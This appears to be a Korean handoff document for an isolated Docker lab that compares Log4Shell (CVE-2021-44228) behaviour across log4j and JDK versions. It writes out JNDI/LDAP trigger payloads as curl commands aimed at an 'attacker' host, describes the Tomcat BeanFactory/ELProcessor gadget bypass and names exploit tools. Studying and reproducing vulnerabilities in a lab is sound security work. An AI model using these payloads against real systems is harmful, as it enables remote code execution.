# Log4Shell 비교 실습 랩 — 담당 A 인계 문서 (Tomcat 운반체)

> CVE-2021-44228 (Log4Shell) 4개 조건 비교 실습의 **피해자(victim) 환경**.
> 운반체를 Apache Solr → **Tomcat 9 + 커스텀 취약 WAR** 로 전환한 버전.
> 네트워크: **완전 격리(internal) 적용** · 저장소: https://github.com/EricMin0122/log4shell-lab

---

## 0. 변경 요약 (Solr → Tomcat)  ⚠️ B·C 필독

| 항목 | 이전(Solr) | 현재(Tomcat) |
|---|---|---|
| 피해자 운반체 | Apache Solr 8.11 (Jetty 기반) | **Tomcat 9 + 최소 취약 WAR(`vuln-app`)** |
| 트리거 | `GET /solr/admin/cores?action=<payload>` | `GET http://victim-vN:8080/?x=<payload>` 또는 `User-Agent` 헤더 |
| 포트 | 8983 | **8080** |
| victim-v1 JDK | 8u102 | **8u181** (둘 다 <8u191, 동작 동일) |

**왜 바꿨나 (핵심):** 조건 ③(로컬 가젯 체인)의 표준 경로는
`org.apache.naming.factory.BeanFactory` + `javax.el.ELProcessor` 조합인데,
이 클래스들은 **Tomcat** 에만 상주한다. Solr 는 Jetty 기반이라 해당 가젯이 없어
③을 **원리적으로 재현할 수 없었다.** Tomcat 운반체로 통일하면 ①②③④가 단일 환경에서 모두 성립한다.

> victim-v1 이 8u181 인 이유: 공식 이미지로 패치레벨을 안정적으로 고정하기 위함.
> trustURLCodebase 의 경계는 8u191 이므로 8u102·8u181 모두 기본값 `true` 로 ①이 동일하게 동작한다.
> 보고서에 8u102 표기가 꼭 필요하면 `victim-v1/Dockerfile` 의 `FROM openjdk:8u181-jre` 한 줄만 교체하면 된다(동작 불변).

**추가 고정 (조건③ 필수):** victim-v2 의 Tomcat 은 **9.0.56 (Server built: Dec 2 2021)** 으로 고정한다.
2022년 보안 하드닝에서 `BeanFactory` 의 **`forceString` 옵션이 제거**되어, 최신 Tomcat(9.0.124 등)에서는
`BeanFactory→ELProcessor` 로컬 가젯이 막힌다(증상: `javax.naming.NamingException: No set method found for property [...]`).
사건 시점 버전으로 되돌려 ③ 를 당시 우회 그대로 재현한다. 최종 베이스 `openjdk:8u212-jre`·JDK 패치레벨(8u212)은
그대로라 **②(원격 로딩 차단)에는 영향 없다.** (victim-v1/v3 는 ①·④ 가 Tomcat 로컬 가젯과 무관하므로 버전 고정 불필요.)

---

## 1. 개요

Log4j 2 취약점(CVE-2021-44228)이 **log4j 버전**과 **JDK 버전**에 따라 어떻게 다르게
동작하는지를 같은 운반체로 비교하는 실습이다. 피해자는 log4j 2 를 번들한 **최소 취약 웹앱
(`vuln-app`)을 Tomcat 9 에 배포**한 것으로, 조건별로 JDK/log4j 버전만 달리한 3종 컨테이너로
구성된다. 모든 컨테이너는 외부 인터넷과 차단된 격리 네트워크(`labnet`, internal) 위에서 동작한다.

## 2. 조건 / 피해자 매핑

| 서비스 | 조건 | log4j | JDK | 포트 | 기대 동작 |
|---|---|---|---|---|---|
| victim-v1 | ① 2.14.1 + 구JDK | 2.14.1 | 8u181 | 8080 | JNDI 질의 + 원격 클래스 로딩(RCE) |
| victim-v2 | ② 2.14.1 + 신JDK | 2.14.1 | 8u212 | 8080 | JNDI 질의 O, 원격 로딩 X |
| victim-v2 | ③ 로컬 가젯 체인 | 2.14.1 | 8u212 | 8080 | BeanFactory+EL 로컬 가젯 → RCE |
| victim-v3 | ④ 패치(대조군) | 2.17.1 | 11 | 8080 | JNDI 질의 자체 차단 |

- **②와 ③은 같은 victim-v2** 를 쓰고 **페이로드만** 다르다.
- **①↔②** 는 WAR·log4j 가 동일하고 **JDK 패치레벨만** 다르다(8u181 vs 8u212).
  8u191 을 경계로 `trustURLCodebase` 기본값이 `true→false` 로 바뀌는 것이 차이의 원인이다.
- **victim-v2 Tomcat 은 9.0.56 고정**(③ 가젯의 `forceString` 전제 때문 — §0 참조). victim-v1/v3 는 Tomcat 버전 무관.

## 3. 취약점 성립 구조 (왜 터지나)

- `vuln-app` 이 `log4j-core` 를 `WEB-INF/lib` 에 번들하고, `VulnServlet` 이 요청의
  쿼리 파라미터 `x` 와 `User-Agent` 헤더를 **그대로 로깅**한다 → 메시지 lookup 으로
  `${jndi:...}` 가 평가되어 JNDI 질의가 발생한다(2.14.1).
- Tomcat 은 `catalina.jar`(`org.apache.naming.factory.BeanFactory`)와
  `el-api.jar`(`javax.el.ELProcessor`)를 common 클래스로더로 제공한다 → 웹앱에서 **로컬 참조로
  해석 가능** → 원격 로딩이 막힌 신JDK 에서도 ③(로컬 가젯 RCE)이 성립한다. 단 이 가젯은 `BeanFactory` 의
  `forceString` 이 살아있는 Tomcat 에서만 통하므로, victim-v2 는 Tomcat **9.0.56** 으로 고정한다(§0 참조).
- v3 는 log4j 2.17.1 이라 `JndiLookup` 자체가 없어 ④(질의 미발생)가 된다.

## 4. 저장소 구조

```
log4shell-lab/
├── docker-compose.yml
├── vuln-app/                     # 공통 취약 운반체
│   ├── pom.xml                   # log4j 버전은 -Dlog4j.version 으로 주입
│   └── src/main/
│       ├── java/com/example/VulnServlet.java   # 요청 파라미터/헤더 로깅
│       └── resources/log4j2.xml
├── victim-v1/Dockerfile          # 2.14.1 + 8u181
├── victim-v2/Dockerfile          # 2.14.1 + 8u212 + Tomcat 9.0.56(고정, ③용)
├── victim-v3/Dockerfile          # 2.17.1 + JDK 11
└── docs/victim-handoff.md
```

각 Dockerfile 은 ① maven 스테이지에서 WAR 빌드(ARG `LOG4J_VERSION`) → ② 공식 `tomcat` 이미지의
안정 경로 `/usr/local/tomcat` 를 복사 → ③ 조건별 고정 JRE 베이스에 올리는 멀티스테이지 구성이다.
(JRE 내부 경로를 추측하지 않도록, 옮기는 쪽을 "경로가 안정적인 Tomcat" 으로 둔 것이 포인트.)

## 5. 네트워크 격리 (중요, 이전과 동일)

`labnet` 은 `internal: true` 로 **컨테이너의 외부 인터넷 접근이 차단**된다. Docker Desktop 에서는
이 설정이 호스트의 published 포트 접근(localhost:8080 등)까지 막으므로, **호스트 브라우저로 직접
접속할 수 없다.** 모든 조작은 랩 내부(`docker exec` 또는 `labnet` 에 붙은 컨테이너)에서 한다.

- 외부 egress: 차단 · 내부 통신: 정상
- 호스트 UI 가 꼭 필요하면 compose 의 `internal: true` 한 줄 제거(일반 bridge) → published 포트 활성.
  단 그 경우 외부 egress 가 열린다(공격자가 로컬이라 실험엔 무방).
- 네트워크 설정을 바꾼 뒤에는 반드시 `docker compose down` 후 다시 `up` (내부 DNS 꼬임 방지).

## 6. 빌드·실행

```
docker compose build          # 3종 모두 로컬 빌드 (최초 1회 인터넷 필요: 베이스 이미지 + maven 의존성)
docker compose up -d
docker compose ps             # victim-v1/2/3 Up 확인
docker compose down           # 전체 정리
```

## 7. 환경 검증 (받은 뒤 확인용)

```
# JDK 패치레벨
docker compose exec victim-v1 java -version      # 1.8.0_181
docker compose exec victim-v2 java -version      # 1.8.0_212
docker compose exec victim-v3 java -version      # 11.0.x

# log4j 버전 (WAR 전개 후)
docker compose exec victim-v1 sh -c "ls /usr/local/tomcat/webapps/ROOT/WEB-INF/lib/log4j-core-*.jar"   # 2.14.1
docker compose exec victim-v3 sh -c "ls /usr/local/tomcat/webapps/ROOT/WEB-INF/lib/log4j-core-*.jar"   # 2.17.1

# 조건 3 전제(1): victim-v2 Tomcat 버전 = 9.0.56 (forceString 유지 버전)
docker compose exec victim-v2 catalina.sh version | grep "Server version"   # Apache Tomcat/9.0.56
# 조건 3 전제(2): Tomcat 가젯 클래스 상주 확인 (catalina.jar / el-api.jar)
docker compose exec victim-v2 sh -c "ls /usr/local/tomcat/lib/catalina.jar /usr/local/tomcat/lib/*el-api*.jar"

# Tomcat 기동 + 앱 배포 확인
docker compose logs victim-v1 | grep -i "Server startup"

# 격리 검증 (curl 없이 bash /dev/tcp 로 TCP 확인)
docker compose exec victim-v1 bash -c 'echo > /dev/tcp/victim-v3/8080 && echo INTERNAL_OK'   # 내부 통신 OK
docker compose exec victim-v1 bash -c 'timeout 3 bash -c "echo > /dev/tcp/1.1.1.1/443" && echo OPEN || echo BLOCKED'  # 외부 차단 => BLOCKED
```

## 8. 공격자 연결 규약 (담당 B)

- **네트워크**: `labnet` — 공격자 컨테이너를 반드시 여기에 연결(compose 에 `attacker` 서비스로 추가).
- **공격자 호스트명**: `attacker` — 피해자가 페이로드에서 `ldap://attacker:1389/...` 로 호출.
- **피해자 주소(내부)**: `http://victim-v1:8080/` / `victim-v2:8080` / `victim-v3:8080` (호스트 localhost 아님 — 격리).
- **트리거 지점**: 쿼리 파라미터 `x` 또는 `User-Agent` 헤더(헤더 쪽이 URL 인코딩 걱정이 없어 편함).
  ```
  # 헤더 방식(권장)
  curl -H 'User-Agent: ${jndi:ldap://attacker:1389/<path>}' http://victim-v1:8080/
  # 파라미터 방식
  curl 'http://victim-v1:8080/?x=${jndi:ldap://attacker:1389/<path>}'
  ```
- **조건별 페이로드**
  - ① victim-v1(8u181): **원격 클래스 로딩**. LDAP 가 원격 코드베이스(`javaCodebase=http://attacker:<p>/`)를
    가리키는 Reference 반환 → 악성 클래스 로딩·실행. 도구: JNDIExploit / rogue-jndi / Java-Chains.
  - ② victim-v2(8u212): **①과 동일 페이로드** → 원격 로딩 **차단**(클래스 미로딩). LDAP 질의 자체는 발생(C 가 포착).
  - ③ victim-v2(8u212): **로컬 가젯 체인**. `org.apache.naming.factory.BeanFactory` + `javax.el.ELProcessor`
    기반 payload(원격 로딩 불필요 → trustURLCodebase 무관). 도구: Java-Chains 의 로컬/Tomcat 우회 체인,
    JNDIExploit 의 Tomcat 가젯.
  - ④ victim-v3(2.17.1): 어떤 payload 든 JNDI 질의 자체가 발생하지 않음.
- **성공 마커**: 페이로드 실행 시 피해자 컨테이너에 `/tmp/success` 생성(예: `touch /tmp/success`).

## 9. 검증/지표 규약 (담당 C)

4개 확인 지표:

1. **JNDI/LDAP 질의 발생** — 공격자 LDAP 서버 로그 또는 `labnet` tcpdump 로 포착.
2. **원격 클래스 로딩 여부** — 실행 증거 `/tmp/success`: `docker compose exec victim-v1 ls -l /tmp/success` (①에서 생성).
3. **로컬 가젯 동작** — 동일 마커로 판정(③, victim-v2).
4. **패치 전후 차이** — ④(victim-v3)에서는 JNDI 질의 자체가 발생하지 않음.

- 모든 관찰은 `docker exec` / 컨테이너 로그로 수행(격리로 호스트 UI 없음).
- 성공 판정 기준(`/tmp/success`)은 A·B·C 동일 사용.

## 10. 수령 절차 (B·C)

```
git clone https://github.com/EricMin0122/log4shell-lab.git
cd log4shell-lab
docker compose build
docker compose up -d
docker compose exec victim-v1 bash -c 'echo > /dev/tcp/victim-v3/8080 && echo INTERNAL_OK'   # 정상이면 랩 OK
```

---

## 담당 A 체크리스트

- [x] 취약 운반체 전환 설계(Solr→Tomcat, ③ 성립 근거 확정)
- [x] 공통 취약 WAR(`vuln-app`) 작성 — 요청 로깅, log4j 버전 ARG화
- [x] victim 3종 Dockerfile(조건별 JDK/log4j) 작성
- [x] 통합 compose + labnet 격리(internal:true) 유지
- [ ] **빌드·기동·조건별 검증** (호스트 Docker Desktop 에서 수행 — §7)
- [ ] Git 커밋·푸시(본인 GitHub 로그인으로)
